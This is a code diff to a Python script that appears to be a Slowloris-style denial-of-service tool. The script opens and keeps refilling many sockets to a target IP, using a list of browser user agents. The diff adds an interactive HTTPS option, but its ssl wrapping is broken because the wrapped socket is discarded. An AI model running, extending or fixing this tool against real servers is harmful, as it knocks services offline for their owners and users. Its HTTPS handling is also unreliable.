@@ -1,4 +1,4 @@
-import socket, random, time, sys
+import socket, random, time, sys, ssl
 
 listOfSockets = list()
 ip = None
@@ -30,14 +30,18 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
-def socketInit(ip):
+def socketInit(ip, https):
 
 	if ip:
 		
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.settimeout(5)
 		
-		s.connect((ip, 80))
+		if https:
+			ssl.wrap_socket(s)
+			s.connect((ip, 443))
+		else:
+			s.connect((ip, 80))
 
 	else:
 		print('Please enter an IP address!')
@@ -52,10 +56,24 @@ def socketInit(ip):
 
 
 def main():
+
+	https = False
+
 	if len(sys.argv) > 1:
 		ip = sys.argv[1]
 	else:
 		ip = input('IP: ')
+
+	while True:
+		https_ask = input('Is it HTTPS (y/n)? ')
+		if https_ask.lower() == 'y':
+			https = True
+			break
+		elif https_ask.lower() == 'n':
+			https = False
+			break
+		else:
+			print('Please enter "y" or "n".')
 
 	if len(sys.argv) > 2:
 		quantityOfSockets = int(sys.argv[2])
@@ -64,7 +82,7 @@ def main():
 
 	for _ in range(quantityOfSockets):
 		try:
-			s = socketInit(ip)
+			s = socketInit(ip, https)
 		except:
 			break
 		listOfSockets.append(s)
@@ -79,7 +97,7 @@ def main():
 
 			for _ in range(quantityOfSockets - len(listOfSockets)):
 				try:
-					s = socketInit(ip)
+					s = socketInit(ip, https)
 					if s:
 						listOfSockets.append(s)
 				except socket.error:
